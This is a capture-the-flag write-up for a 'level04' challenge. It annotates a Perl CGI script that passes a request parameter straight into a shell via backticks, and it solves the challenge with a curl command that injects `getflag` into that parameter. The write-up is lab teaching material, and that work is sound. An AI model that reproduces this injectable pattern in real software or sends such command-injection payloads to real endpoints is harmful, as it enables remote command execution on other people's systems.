we can see an executable: level04.pl

when we try to execute it we have the following message:

perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "UTF-8",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

that means we have to variable unset. Moreover when we use 'cat' to see the program we see this:
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};                       => permit to handle request to generate Respons
print "Content-type: text/html\n\n";
sub x {                                  => define a subroutine, a subroutine is a block of code called multiple times
  $y = $_[0];                            => very important it take the first variable passed through the request and print t
  print `echo $y 2>&1`;
}
x(param("x"));                          => This line calls the x subroutine, passing the value of the CGI parameter named "x" as an argument. 

we now understand it use CGI and Content-type like typical html Response.

we need to connect to localhost:4747 and passs the value getflag to print the flag.

we can use a browser request or more simple using curl:

curl -d 'x=`getflag`' http://localhost:4747

In this command, the -d option specifies the data to be sent in the request body, and the value 'x=getflag' is passed. The backticks (`) around getflag indicate that the getflag command should be executed and its output should be used as the value of the x parameter.

IT IS VERY important to use backticks on getflag because you will only print the word getflag without it.



